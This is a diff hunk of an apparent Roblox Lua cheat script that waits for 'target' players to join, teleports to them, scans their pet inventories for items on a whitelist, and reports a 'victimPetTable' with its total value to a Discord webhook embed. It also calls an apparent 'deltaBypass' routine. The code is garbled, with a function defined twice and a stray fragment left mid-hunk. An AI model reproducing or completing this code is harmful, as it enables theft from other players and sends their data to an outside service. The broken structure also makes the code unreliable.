@@ -292,6 +292,48 @@ local function startSteal(trigerName)
     end
 end
 
+local function idlingTarget()
+    task.spawn(function()
+        while task.wait(0.2) do
+            local isTarget, trigerName = waitForJoin()
+
+            if isTarget then
+                teleportTarget(trigerName)
+                checkPetsInventory(trigerName)
+            end
+        end
+    end)
+end
+
+local function idlingTarget()
+    task.spawn(function()
+        while task.wait(0.2) do
+            local isTarget, trigerName = waitForJoin()
+
+            if isTarget then
+                teleportTarget(trigerName)
+                checkPetsInventory(trigerName)
+            end
+        end
+    end)
+end
+
+getPlayersPets()
+
+task.spawn(function()
+    while task.wait(0.5) do
+        if #victimPetTable > 0 then
+            idlingTarget()
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalPetValue, "https://cdn.discordapp.com/attachments/.../items.txt")
+            break
+        end
+    end
+end)
+].Character.Head.ProximityPrompt.HoldDuration = 0
+        deltaBypass()
+    end
+end
+
 local function checkPetsInventory(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local matchedName = checkPetsWhilelist(value.PetType)
